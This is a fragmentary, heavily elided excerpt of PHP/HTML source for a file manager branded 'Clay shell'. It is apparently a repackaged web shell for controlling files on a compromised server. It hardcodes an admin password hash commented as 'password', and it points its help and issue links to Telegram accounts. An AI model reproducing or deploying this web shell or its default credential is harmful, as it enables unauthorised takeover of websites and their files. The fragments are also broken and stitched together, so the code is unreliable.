...
$auth_users = array(
    'admin' => '$2y$10$DizEIiK7aQ4QydRnCU9yBueOgrzIcD1IMXp1GfG7OyeCbD2ID9zTy', //password
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://t.me/biskuat15" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">Clay project</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://t.me/szxpl7" target="_blank" class="app-v-title"> Clay <?php echo VERSION; ?></a></h3></p>
                        <p>Author: sandi</p>
                    ...
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://t.me/szxpl7" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://t.me/szxpl7" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://t.me/szxpl7" target="_blank" class="float-right text-muted">Clay <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://t.me/szxpl7" target="_blank" class="float-right text-muted">Clay <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'Clay<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<html lang="en">
<head>
<center><div style="width:590px;max-width:100%;"><img src="https://pomf2.lain.la/f/b0sfuyb.jpg">
    <meta charset="utf-8">
    ...
    <meta name="author" content="Clay project">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Clay';      $tr['en']['AppTitle']           = 'Clay shell';
